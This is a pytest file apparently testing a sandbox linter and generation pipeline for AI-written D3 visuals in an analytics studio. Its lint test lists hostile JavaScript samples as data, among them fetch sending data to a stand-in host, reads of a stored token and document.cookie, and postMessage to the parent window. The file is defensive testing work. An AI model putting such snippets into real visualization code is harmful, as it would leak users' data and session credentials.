"""Custom visuals — the agent writing a D3 visualization as code.

Locked in here:
- the lint catches the usual mistakes (network, HTML writes, the parent window,
  eval, storage) without flagging ordinary d3 (`d.parent`, `margin.top`);
- a reply is parsed out of fences or prose, capped, and refused when empty;
- one retry, carrying the reason, before giving up; only a sample of the rows
  ever reaches the model;
- render_visual, run through run_agent, records a panel with the SQL, the rows
  and the code, using the conversation's own model and user; it is offered on
  full chat turns with a frontier model only;
- read-time authorization treats a visual as data: no attributable SQL, no
  release.
"""
import json
import sys
import types

import pytest

from app import agent, chat, db, governance, visuals
from app.connectors.demo import DemoConnector, seed

ANALYST = {"id": "u-vis", "email": "vis@studio.test", "role": "analyst"}


@pytest.fixture(scope="module", autouse=True)
def _tables():
    db.init_db()
    seed()
    yield


@pytest.fixture(autouse=True)
def _builtin_rbac():
    governance._STATE.update(doc=None, yaml="", source=None)
    yield
    governance._STATE.update(doc=None, yaml="", source=None)
GOOD = ("const svg = d3.select(el).append('svg').attr('width', size.width)"
        ".attr('height', size.height);\n"
        "svg.selectAll('text').data(data).join('text').text(d => d.region);")


@pytest.mark.parametrize("code,why", [
    ("fetch('https://x.example?d=' + data)", "fetch"),
    ("new XMLHttpRequest()", "XMLHttpRequest"),
    ("new WebSocket('wss://x')", "network API"),
    ("d3.select(el).html(data[0].name)", "writing HTML"),
    ("el.innerHTML = 'x'", "writing HTML"),
    ("eval('1')", "eval"),
    ("const f = new Function('return 1')", "eval"),
    ("window.parent.document", "parent window"),
    ("parent.postMessage(data, '*')", "parent window"),
    ("top.location = 'https://x'", "parent window"),
    ("localStorage.getItem('studio_token')", "storage"),
    ("document.cookie", "storage"),
    ("import('https://x.example/m.js')", "dynamic import"),
])
def test_lint_catches_the_usual_mistakes(code, why):
    assert any(why in p for p in visuals.lint(code)), (code, visuals.lint(code))


def test_lint_leaves_ordinary_d3_alone():
    code = """
    const margin = {top: 10, right: 10}; const y0 = margin.top + 2;
    root.descendants().forEach(d => d.parent && d.parent.data.name);
    function myFunction(x) { return x; } myFunction(1);
    d3.select(el).append('text').text(d => d.label);
    """
    assert visuals.lint(code) == []


def test_parse_reads_fenced_or_wrapped_json_and_caps_it():
    reply = "Here you go:\n```json\n" + json.dumps(
        {"title": "T" * 300, "code": GOOD, "explanation": "E"}) + "\n```"
    out = visuals.parse(reply)
    assert out["code"] == GOOD and len(out["title"]) == 120 and out["explanation"] == "E"
    with pytest.raises(visuals.VisualError, match="no code"):
        visuals.parse(json.dumps({"title": "x", "code": "  "}))
    with pytest.raises(visuals.VisualError, match="characters"):
        visuals.parse(json.dumps({"code": "x" * (visuals.MAX_CODE_CHARS + 1)}))
    with pytest.raises(visuals.VisualError, match="no JSON"):
        visuals.parse("I could not do it.")


class _Reply:
    def __init__(self, text):
        self.content = text


class _Script:
    """A model that answers from a script, recording every prompt it got."""

    def __init__(self, *replies):
        self.replies = list(replies)
        self.calls = []

    def invoke(self, messages):
        self.calls.append(messages)
        return _Reply(self.replies.pop(0))


def _visual(code=GOOD, title="Revenue rings"):
    return json.dumps({"title": title, "code": code, "explanation": "Rings by region."})


def test_generate_retries_once_with_the_reason_then_returns():
    llm = _Script(_visual(code="fetch('/x'); " + GOOD), _visual())
    rows = [[f"r{i}", i] for i in range(100)]
    out = visuals.generate(llm, ["region", "revenue"], rows, "rings by region")
    assert out["title"] == "Revenue rings" and out["code"] == GOOD
    assert len(llm.calls) == 2
    assert "rejected" in llm.calls[1][1][1] and "fetch" in llm.calls[1][1][1]
    # Only a sample of the rows was sent, with the shape of every column.
    sent = json.loads(llm.calls[0][1][1])
    assert len(sent["sample_rows"]) == visuals.SAMPLE_ROWS and sent["row_count"] == 100
    assert sent["column_types"] == {"region": "text", "revenue": "number"}


def test_generate_gives_up_after_the_retry():
    llm = _Script("not json", _visual(code="el.innerHTML = 'x'"))
    with pytest.raises(visuals.VisualError, match="writing HTML"):
        visuals.generate(llm, ["a"], [[1]], "anything")


# ── render_visual, through run_agent ────────────────────────────────────

def _stub_langchain_tools(monkeypatch):
    try:
        import langchain_core.tools  # noqa: F401
        return
    except ImportError:
        pass
    pkg = types.ModuleType("langchain_core")
    pkg.__path__ = []
    tools = types.ModuleType("langchain_core.tools")
    tools.tool = lambda fn: fn
    monkeypatch.setitem(sys.modules, "langchain_core", pkg)
    monkeypatch.setitem(sys.modules, "langchain_core.tools", tools)


class _Msg:
    type = "ai"

    def __init__(self, text):
        self.content = text


def _name(t):
    return getattr(t, "__name__", "") or getattr(t, "name", "")


def _call(t, **kw):
    return t.invoke(kw) if hasattr(t, "invoke") else t(**kw)


def _run(monkeypatch, script, tool_profile="full"):
    _stub_langchain_tools(monkeypatch)
    seen = {"users": [], "tools": []}

    def make_llm(spec, user=None, **kw):
        seen["users"].append(user)
        return script

    monkeypatch.setattr(agent, "llm_available", lambda *a, **k: True)
    monkeypatch.setattr(agent, "make_llm", make_llm)
    monkeypatch.setattr(agent, "mcp_servers", lambda user=None: {})

    def fake_graph(llm, tools, system, spec, volatile=None):
        seen["tools"] = [_name(t) for t in tools]

        class G:
            def invoke(self, state, config=None):
                by = {_name(t): t for t in tools}
                _call(by["run_sql"],
                      sql="SELECT region, SUM(revenue) AS revenue FROM sales GROUP BY 1")
                if "render_visual" in by:
                    seen["result"] = _call(by["render_visual"], title="Rings",
                                           request="concentric rings, one per region")
                return {"messages": [_Msg("done")]}
        return G()

    monkeypatch.setattr(agent, "_graph", fake_graph)
    out = agent.run_agent("draw revenue as rings", DemoConnector(), "sales", ["sales"],
                          {"sales": []}, [], ANALYST, tool_profile=tool_profile)
    return out, seen


def test_render_visual_records_a_panel_with_the_sql_rows_and_code(monkeypatch):
    out, seen = _run(monkeypatch, _Script(_visual()))
    assert seen["result"].startswith("Custom visual panel 1 recorded")
    panel = out["panels"][-1]
    assert panel["visual"]["code"] == GOOD and panel["visual"]["title"] == "Revenue rings"
    assert panel["visual"]["request"] == "concentric rings, one per region"
    assert panel["sql"].upper().startswith("SELECT REGION") and panel["rows"]
    assert panel["chart"] == {"type": "table", "title": "Revenue rings"}
    # The code was written by the conversation's own model, for this user.
    assert all(u is ANALYST for u in seen["users"])


def test_render_visual_is_offered_on_full_turns_with_a_frontier_model_only(monkeypatch):
    _, seen = _run(monkeypatch, _Script(_visual()))
    assert "render_visual" in seen["tools"]
    _, seen = _run(monkeypatch, _Script(_visual()), tool_profile="graph_worker")
    assert "render_visual" not in seen["tools"]
    monkeypatch.setattr(agent, "self_hosted", lambda spec: True)
    _, seen = _run(monkeypatch, _Script(_visual()))
    assert "render_visual" not in seen["tools"]


def test_a_failed_visual_tells_the_agent_to_fall_back(monkeypatch):
    out, seen = _run(monkeypatch, _Script("nope", "still nope"))
    assert seen["result"].startswith("Could not write the visual")
    assert not any(p.get("visual") for p in out["panels"])


def test_a_visual_counts_as_data_for_read_time_authorization():
    # A visual with no attributable SQL is not released, like rows would not be.
    content = {"panels": [{"visual": {"code": "/* EU: 125 */"}}]}
    assert chat._sql_tables_allowed("analyst", "demo", content) is False


def test_the_prompt_asks_for_an_interactive_artifact_with_motion():
    """Custom visuals are built like Claude artifacts: their own controls (via
    the sandbox's ui helper) on top of Studio's date/category filters, and
    marks that animate in and move between states — unless the reader asked
    for reduced motion."""
    p = visuals.PROMPT
    assert "function draw(d3, data, el, size, ui)" in p
    for helper in ("ui.bar(el)", "ui.select(", "ui.slider(", "ui.toggle("):
        assert helper in p, helper
    assert "Studio already puts a date range, category" in p      # don't rebuild those
    assert "keyed joins" in p and "ui.reducedMotion" in p


@pytest.mark.parametrize("wrapped", [
    'function draw(d3, data, el, size, ui) {\n  d3.select(el).append("svg");\n  var s = "}{";\n}',
    'function draw(d3, data, el, size) { d3.select(el).append("svg"); var s = "}{"; }',
    'const draw = (d3, data, el, size, ui) => {\n  d3.select(el).append("svg");\n  var s = "}{";\n};',
])
def test_a_whole_draw_function_is_reduced_to_its_body(wrapped):
    """Written as the whole function, the runner only declared a nested draw:
    a blank frame, no error. parse() keeps just the body."""
    out = visuals.parse(json.dumps({"title": "t", "code": wrapped, "explanation": "e"}))["code"]
    assert not out.lstrip().startswith(("function draw", "const draw"))
    assert 'd3.select(el).append("svg");' in out and 'var s = "}{";' in out


@pytest.mark.parametrize("code", [
    'd3.select(el).append("svg");',                                       # already a body
    "function draw(a, b) { return 1; }",                                  # another function
    "function draw(d3, data, el, size) { x(); }\ndraw(d3, data, el, size);",  # wrapper, then a call
    "function draw(d3, data, el, size) { helper(); }\nfunction helper() { x(); }",  # two functions
])
def test_anything_else_is_left_as_written(code):
    assert visuals.unwrap(code) == code
